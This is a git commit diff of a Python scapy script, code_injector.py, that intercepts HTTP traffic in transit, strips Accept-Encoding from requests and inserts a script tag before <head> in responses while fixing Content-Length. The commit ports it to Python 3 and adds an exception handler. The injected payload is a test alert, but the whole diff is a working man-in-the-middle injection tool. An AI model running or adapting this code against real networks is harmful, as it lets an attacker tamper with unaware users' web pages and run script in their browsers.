a7ef19c0268d8650b1a36bd07599af14b6b87d4e
Andreas W <31095453+Sir-Casm@users.noreply.github.com>
2022-08-29 17:11:16 +0200

    updated to be compatible with python 3
    + added exception for UnicodeDecodeError, for Responses where no HTML code is present

--- code_injector.py
+++ code_injector.py
@@ -17,24 +17,29 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = inet.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(inet.TCP):
-        load = scapy_packet[scapy.Raw].load.decode()
-        if scapy_packet[inet.TCP].dport == 80:
-            print("Request:")
-            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
-
-        elif scapy_packet[inet.TCP].sport == 80:
-            print("Response:")
-            injection_code = "<script>alert('test');</script>"
-            load = load.replace("<head>", injection_code + "<head>")
-            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
-            if content_length_search and "text/html" in load:
-                content_length = content_length_search.group(1)
-                new_content_length = int(content_length) + len(injection_code)
-                load = load.replace(content_length, str(new_content_length))
-
-        if load != scapy_packet[scapy.Raw].load:
-            new_packet = set_load(scapy_packet, load)
-            packet.set_payload(bytes(new_packet))
+        try:
+            load = scapy_packet[scapy.Raw].load.decode()
+            
+            if scapy_packet[inet.TCP].dport == 80:
+                print("Request: Removing encoding...")
+                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+    
+            elif scapy_packet[inet.TCP].sport == 80:
+                print("Response: Injecting code...")
+                injection_code = "<script>alert('test');</script>"
+                load = load.replace("<head>", injection_code + "<head>")
+                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+                if content_length_search and "text/html" in load:
+                    content_length = content_length_search.group(1)
+                    new_content_length = int(content_length) + len(injection_code)
+                    load = load.replace(content_length, str(new_content_length))
+    
+            if load != scapy_packet[scapy.Raw].load:
+                new_packet = set_load(scapy_packet, load)
+                packet.set_payload(bytes(new_packet))
+                
+        except UnicodeDecodeError:
+            pass
 
     packet.accept()
 
